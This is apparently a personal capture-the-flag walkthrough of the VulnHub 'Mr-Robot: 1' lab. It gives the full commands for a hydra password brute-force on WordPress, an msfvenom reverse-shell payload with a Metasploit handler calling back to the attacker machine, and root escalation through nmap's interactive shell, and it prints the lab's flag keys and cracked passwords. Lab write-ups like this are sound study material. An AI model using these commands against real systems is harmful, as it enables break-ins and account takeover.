# Mr-Robot: 1
[VulnHub link](https://www.vulnhub.com/entry/mr-robot-1,151/)  
By Leon Johnson

Note:
* Using nmap/Zenmap to find out the victim's IP address, by scanning all IP addresses on a specific subnet is required because we are unable to get to the page of a GUI-based login page to view network information.
* We are presented with a CLI-based login method instead.

Walkthrough:
* Run `ifconfig` to find out what our IP address is (e.g. 192.168.153.160). Also, run `route -n` to see what our router gateway IP address is (e.g. 192.168.153.2). Find out the IP addresses of our known machines first to give us an idea into what IP address we should expect for our victim VM.
* Our target address on nmap/Zenmap is thus `192.168.153.*`. Run with the intense scan option if using Zenmap.
* Eliminate the addresses from the scan results based on the hosts that are already known to us, to see which other host is alive.
* This leaves us with 192.168.153.174 which is running on Linux and has open ports 80 (http) and 443 (tcp) with ssl. Port 22 (ssh) is closed.
* Open 192.168.153.174 on our browser and we get an interactive-style page greeting us.
* Run `uniscan -u 192.168.153.174 -qweds`.
* Note: uniscan is a Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. -q enables directory checks, -w enables file checks, -e enables robots.txt and sitemap.xml check, -d enables dynamic checks and -s enables static checks.
* uniscan vs. dirbuster: *to-be-added*
* From the scan results, we see that the site is running on WordPress, given the many specific references: wp-includes, wp-admin, wp-content directories and a bunch of external hosts that have to do with WordPress resources.
* Since there is a robots.txt found from the scan, open it and we see that there are 2 files listed: fsocity.dic (dictionary) and key-1-of-3.txt.
* Run `wget 192.168.153.174/key-1-of-3.txt` to download the text file to our Kali VM, and do the same thing with the .dic file.
* key-1-of-3.txt contains a string (`073403c8a58a1f80d943455fb30724b9`): after running hash-identifer against it, we know that it could be a MD5 hash. We also know that the .dic file appears to be a wordlist.
* Head to the wp-login section of the WordPress site on our browser, for which we have to get the credentials to. After which, we can get a reverse shell.
* Insert a random parameter string at the end of the site (e.g. `/imag`), in order to get the error message that the site does not exist. This is one way for us to see the actual WordPress site instead of the interactive-style site that greeted us (which did not quite show us how we are able to escape that page to head to other pages of the site).
* After getting to the WordPress site, we see that there is a user elliot, from the only post on the site titled "TestPOst". elliot is also likely to be a username to a WordPress account.
* Run `wpscan --url 192.168.153.174 --enumerate users` to find out the usernames of other users on the WordPress site.
* wpscan: a black box WordPress vulnerability scanner. *to-be-continued*
* Head to the WordPress login site and attempt to login with a random password for the username `elliot`. There is an error stating that the password for elliot is incorrect. Thus, we now know that the username elliot indeed exists, and our next step is to brute-force the password for that account.
* Run hydra 192.168.153.174 http-form-post "/wp-login.php:log=elliot&pwd=^PASS^:ERROR" -l elliot -P /tut/fsocity.dic -t 10 -w 30
* hydra: parallelized login cracker which supports numerous protocols to attack.
* Note: log and pwd are found by inspecting the input elements of the page's username and password fields through Developer Tools: `<input id="user_login" class="input" name="log"...>` and `<input id="user_pass" class="input" name="pwd"...>`
* The password (ER28-0652) is found somewhere at the bottom of the .dic file, thus it took quite some time to get it.
* After logging in as elliot, we are able to login and install as plugin called [File Manager](https://wordpress.org/plugins/wp-file-manager/).
* Run `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.160 LPORT=4000 -f raw > shell.php` on our Kali VM to generate our payload. The LHOST is the IP address of our Kali VM.
* The payload is shell.php. Upload it through File Manager, and the file path is htdocs/wp-content/uploads/shell.php.
* Run `msfconsole` on our Kali VM. Run `use exploit/multi/handler` and `set payload php/meterpreter_reverse_tcp`.
* Run `set LPORT=4000` and `set LHOST=192.168.153.160` (IP address of our Kali VM).
* Run `exploit -j -z`. Open our reverse shell on the victim VM, and we will see from our Kali VM terminal that a session has been started.
* Run `sessions -i 1` then `sysinfo` to confirm that we are running on a Linux machine as detected earlier from our nmap/Zenmap scan.
* Navigate to our home directory and we find a directory called robot. Enter robot and we find key-2-of-3.txt and password.raw-md5.
* The key text file cannot be opened by us at the moment because the file is only readable by root, with no other permissions set. However, the password.raw-md5 file can be opened by us.
* We find the username `robot` and his password hash (`c3fcd3d76192e4007dfb496cca67e13b`) within the password file. Search for the original value behind the MD5 hash on the Google search engine, and we have now got the password (`abcdefghijklmnopqrstuvwxyz`) to robot.
* To-do: try to login via ssh using robot username and password. Ensure that the IP address of the victim VM is entered correctly.
* After logging in as robot, we find that we are able to open key-2-of-3.txt.
* We have to now find the last key, which is in /root. However, even after logging in as robot, we do not have the permission to navigate to /root. We have to do a privilege escalation here, using a badly configured nmap.
* Run `nmap`, `nmap --interactive` and then `!sh` to get a shell. `whoami` shows that we are now `root`.
* Head to /root and we find key-3-of-3.txt: `04787ddef27c3dee1ee161b21670b4e4`.
